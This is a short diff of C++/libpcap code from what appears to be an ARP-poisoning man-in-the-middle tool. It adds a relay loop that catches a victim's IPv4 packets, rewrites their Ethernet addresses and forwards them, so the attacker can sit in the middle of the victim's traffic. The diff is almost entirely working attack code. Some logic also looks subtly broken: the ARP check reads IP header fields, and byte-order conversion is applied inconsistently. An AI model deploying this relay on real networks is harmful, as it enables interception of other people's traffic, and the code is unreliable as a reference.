@@ -153,6 +153,7 @@ bool SendArpInfectPkt(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip
     return true;
 }
 
+
 bool IpPacketRelay(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, Mac target_mac){
 
     while (true)
@@ -172,14 +173,21 @@ bool IpPacketRelay(pcap_t* handle, Ip sender_ip, Mac sender_mac, Ip target_ip, M
         // 1. from sender
         // 2. to gateway
         EthIpPacket* _recv_packet = (EthIpPacket*) recv_packet;
-        if (_recv_packet->eth_.type() == EthHdr::Ip4){
-            if (_recv_packet->ip_.sip == sender_ip && _recv_packet->ip_.dip ==  target_ip ){
+        if (_recv_packet->eth_.type() == EthHdr::Ip4 && _recv_packet->eth_.dmac() != Mac("FF:FF:FF:FF:FF:FF")){
+            if (_recv_packet->ip_.sip == htonl(sender_ip) && _recv_packet->ip_.dip !=  htonl(myIp) ){
                 
-                break;
+                _recv_packet->eth_.smac_ = myMac;
+                _recv_packet->eth_.dmac_ = target_mac;
+
+                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(_recv_packet), header->caplen);
+                if (res != 0) {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                }
+                
             }
         }
 
-        if (_recv_packet->eth_.type() == EthHdr::Ip4){
+        if (_recv_packet->eth_.type() == EthHdr::Arp){
             if (_recv_packet->ip_.sip == sender_ip && _recv_packet->ip_.dip ==  target_ip ){
                 break;
             }
